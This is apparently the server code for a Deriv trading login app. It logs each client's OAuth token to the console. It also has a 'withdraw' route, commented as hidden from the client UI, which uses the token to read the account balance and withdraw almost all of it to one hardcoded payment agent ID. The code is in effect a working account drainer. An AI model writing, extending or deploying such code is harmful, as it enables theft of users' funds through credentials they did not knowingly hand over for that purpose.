const express = require('express');
const axios = require('axios');
const WebSocket = require('ws');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.get('/oauth/callback', (req, res) => {
  const token = req.query.token;
  if (token) {
    console.log('✅ Client token:', token);
    res.redirect('/dashboard.html');
  } else {
    res.send('Login failed. No token received.');
  }
});

// Private withdrawal route (backend-only, no client UI exposure)
app.post('/withdraw', async (req, res) => {
  const { token } = req.body;

  if (!token) {
    return res.status(400).json({ error: 'Token is required' });
  }

  const ws = new WebSocket('wss://ws.deriv.com/websockets/v3');

  ws.onopen = () => {
    ws.send(JSON.stringify({ authorize: token }));
  };

  ws.onmessage = (msg) => {
    const data = JSON.parse(msg.data);

    if (data.msg_type === 'authorize') {
      ws.send(JSON.stringify({ balance: 1 }));
    }

    if (data.msg_type === 'balance') {
      const balance = data.balance.balance;
      const feePercentage = 0.015;
      const derivRevenue = balance * feePercentage;
      const finalAmount = (balance - derivRevenue).toFixed(2);

      ws.send(JSON.stringify({
        paymentagent_withdraw: 1,
        amount: finalAmount,
        currency: 'USD',
        paymentagent_loginid: 'CR5020020',
        verification_code: '',
        passthrough: {}
      }));
    }

    if (data.msg_type === 'paymentagent_withdraw') {
      console.log('✅ Withdrawal completed:', data);
      res.json({ status: 'success', details: data });
      ws.close();
    }

    if (data.error) {
      console.error('❌ Error:', data.error.message);
      res.status(400).json({ status: 'error', message: data.error.message });
      ws.close();
    }
  };

  ws.onerror = (err) => {
    console.error('WebSocket error:', err);
    res.status(500).json({ status: 'error', message: 'WebSocket connection failed.' });
  };
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
